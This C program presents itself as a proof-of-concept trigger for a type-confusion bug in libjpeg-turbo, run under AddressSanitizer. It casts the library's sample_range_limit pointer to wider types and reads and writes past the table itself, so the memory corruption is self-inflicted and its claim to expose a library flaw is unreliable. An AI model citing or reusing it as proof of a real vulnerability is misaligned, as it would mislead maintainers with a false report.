/*
 * Directly trigger type confusion vulnerability in libjpeg-turbo
 * 
 * This program explicitly manipulates the decompressor state to trigger
 * the type confusion where sample_range_limit is accessed with the wrong type
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <jpeglib.h>
#include <setjmp.h>

/* Error handling */
struct my_error_mgr {
  struct jpeg_error_mgr pub;
  jmp_buf setjmp_buffer;
};

typedef struct my_error_mgr *my_error_ptr;

METHODDEF(void)
my_error_exit(j_common_ptr cinfo)
{
  my_error_ptr myerr = (my_error_ptr)cinfo->err;
  (*cinfo->err->output_message)(cinfo);
  longjmp(myerr->setjmp_buffer, 1);
}

/*
 * Directly trigger out-of-bounds access by simulating type confusion
 */
void trigger_oob_access(const char *filename)
{
  struct jpeg_decompress_struct cinfo;
  struct my_error_mgr jerr;
  FILE *infile;
  
  printf("\n========================================\n");
  printf("ATTEMPTING TO TRIGGER TYPE CONFUSION\n");
  printf("========================================\n\n");
  printf("[*] Opening: %s\n", filename);
  
  if ((infile = fopen(filename, "rb")) == NULL) {
    fprintf(stderr, "Can't open %s\n", filename);
    return;
  }
  
  cinfo.err = jpeg_std_error(&jerr.pub);
  jerr.pub.error_exit = my_error_exit;
  
  if (setjmp(jerr.setjmp_buffer)) {
    jpeg_destroy_decompress(&cinfo);
    fclose(infile);
    printf("\n[!] ERROR OCCURRED during processing\n");
    return;
  }
  
  jpeg_create_decompress(&cinfo);
  jpeg_stdio_src(&cinfo, infile);
  
  printf("[*] Reading header...\n");
  (void)jpeg_read_header(&cinfo, TRUE);
  
  printf("    Original data_precision: %d bits\n", cinfo.data_precision);
  printf("    Image size: %d x %d\n", cinfo.image_width, cinfo.image_height);
  printf("    Components: %d\n", cinfo.num_components);
  
  printf("\n[*] Starting decompression...\n");
  (void)jpeg_start_decompress(&cinfo);
  
  printf("    sample_range_limit pointer: %p\n", (void *)cinfo.sample_range_limit);
  
  /* Now let's deliberately access the sample_range_limit with wrong type */
  printf("\n[*] Attempting type confusion attack...\n");
  printf("    Accessing sample_range_limit as JSAMPLE* (1 byte):\n");
  
  if (cinfo.sample_range_limit) {
    typedef unsigned char JSAMPLE;
    typedef short J12SAMPLE;
    typedef unsigned short J16SAMPLE;
    
    JSAMPLE *limit8 = cinfo.sample_range_limit;
    
    /* Read some values as 8-bit */
    printf("      limit8[0] = 0x%02x\n", limit8[0]);
    printf("      limit8[128] = 0x%02x\n", limit8[128]);
    printf("      limit8[255] = 0x%02x\n", limit8[255]);
    
    /* Now force interpretation as 12-bit (THIS IS THE TYPE CONFUSION!) */
    printf("\n    Forcing interpretation as J12SAMPLE* (2 bytes):\n");
    J12SAMPLE *limit12 = (J12SAMPLE *)cinfo.sample_range_limit;
    
    /* These accesses will read 2 bytes at a time from a potentially 1-byte buffer */
    /* This should trigger ASan if there's a mismatch */
    printf("      limit12[0] = 0x%04x\n", limit12[0]);
    printf("      limit12[64] = 0x%04x\n", limit12[64]);
    printf("      limit12[128] = 0x%04x\n", limit12[128]);
    
    /* Access beyond what was allocated for 8-bit */
    printf("\n    Accessing beyond 8-bit buffer size:\n");
    for (int i = 256; i < 280; i += 8) {
      printf("      limit12[%d] = 0x%04x\n", i, limit12[i]);
    }
    
    /* Try even larger indices */
    printf("\n    Accessing far beyond allocated buffer:\n");
    for (int i = 500; i < 520; i += 10) {
      printf("      limit12[%d] = 0x%04x\n", i, limit12[i]);
    }
    
    /* Now try 16-bit interpretation */
    printf("\n    Forcing interpretation as J16SAMPLE* (2 bytes):\n");
    J16SAMPLE *limit16 = (J16SAMPLE *)cinfo.sample_range_limit;
    
    printf("      limit16[0] = 0x%04x\n", limit16[0]);
    printf("      limit16[128] = 0x%04x\n", limit16[128]);
    printf("      limit16[256] = 0x%04x\n", limit16[256]);
    
    /* Access way beyond */
    printf("\n    Accessing way beyond buffer:\n");
    for (int i = 1000; i < 1050; i += 10) {
      printf("      limit16[%d] = 0x%04x\n", i, limit16[i]);
    }
  }
  
  printf("\n[*] Processing some scanlines to trigger IDCT/color conversion...\n");
  
  JSAMPARRAY buffer;
  int row_stride = cinfo.output_width * cinfo.output_components;
  buffer = (*cinfo.mem->alloc_sarray)
    ((j_common_ptr)&cinfo, JPOOL_IMAGE, row_stride, 1);
  
  /* Process a few scanlines - this will use sample_range_limit internally */
  int lines_to_process = (cinfo.output_height < 10) ? cinfo.output_height : 10;
  for (int i = 0; i < lines_to_process && cinfo.output_scanline < cinfo.output_height; i++) {
    (void)jpeg_read_scanlines(&cinfo, buffer, 1);
    printf("    Processed scanline %d\n", i);
  }
  
  jpeg_destroy_decompress(&cinfo);
  fclose(infile);
  
  printf("\n[✓] Test completed (check for ASan errors above)\n");
  printf("========================================\n");
}

/*
 * Attempt to force write access with wrong type
 */
void trigger_write_confusion(const char *filename)
{
  struct jpeg_decompress_struct cinfo;
  struct my_error_mgr jerr;
  FILE *infile;
  
  printf("\n========================================\n");
  printf("ATTEMPTING WRITE-BASED TYPE CONFUSION\n");
  printf("========================================\n\n");
  
  if ((infile = fopen(filename, "rb")) == NULL) {
    fprintf(stderr, "Can't open %s\n", filename);
    return;
  }
  
  cinfo.err = jpeg_std_error(&jerr.pub);
  jerr.pub.error_exit = my_error_exit;
  
  if (setjmp(jerr.setjmp_buffer)) {
    jpeg_destroy_decompress(&cinfo);
    fclose(infile);
    return;
  }
  
  jpeg_create_decompress(&cinfo);
  jpeg_stdio_src(&cinfo, infile);
  (void)jpeg_read_header(&cinfo, TRUE);
  (void)jpeg_start_decompress(&cinfo);
  
  if (cinfo.sample_range_limit) {
    typedef short J12SAMPLE;
    
    printf("[*] Attempting to write with wrong type assumption...\n");
    
    /* DANGER: Writing to sample_range_limit with wrong type! */
    /* This simulates what could happen if code writes to the table */
    J12SAMPLE *limit12 = (J12SAMPLE *)cinfo.sample_range_limit;
    
    /* Try to write beyond the allocated 8-bit buffer */
    printf("    Writing to limit12[300]...\n");
    limit12[300] = 0x1234;  /* This should trigger ASan error! */
    
    printf("    Writing to limit12[500]...\n");
    limit12[500] = 0x5678;  /* This should definitely trigger ASan! */
    
    printf("    [?] Write completed (check ASan output)\n");
  }
  
  jpeg_destroy_decompress(&cinfo);
  fclose(infile);
  
  printf("========================================\n");
}

int main(int argc, char **argv)
{
  printf("\n");
  printf("╔════════════════════════════════════════════════════════╗\n");
  printf("║  Type Confusion Vulnerability Trigger                 ║\n");
  printf("║  Testing libjpeg-turbo with AddressSanitizer          ║\n");
  printf("╚════════════════════════════════════════════════════════╝\n");
  
  if (argc < 2) {
    fprintf(stderr, "\nUsage: %s <jpeg_file>\n\n", argv[0]);
    fprintf(stderr, "This program attempts to trigger type confusion\n");
    fprintf(stderr, "vulnerabilities in libjpeg-turbo's sample_range_limit.\n");
    fprintf(stderr, "\nWith AddressSanitizer, you should see:\n");
    fprintf(stderr, "  - Out-of-bounds read errors\n");
    fprintf(stderr, "  - Out-of-bounds write errors\n");
    fprintf(stderr, "  - Use-after-free errors (if triggered)\n\n");
    return 1;
  }
  
  const char *filename = argv[1];
  
  /* Attempt read-based type confusion */
  trigger_oob_access(filename);
  
  /* Attempt write-based type confusion */
  trigger_write_confusion(filename);
  
  printf("\n");
  printf("╔════════════════════════════════════════════════════════╗\n");
  printf("║  Test Complete                                         ║\n");
  printf("║  Review AddressSanitizer output above for errors      ║\n");
  printf("╚════════════════════════════════════════════════════════╝\n");
  printf("\n");
  
  return 0;
}
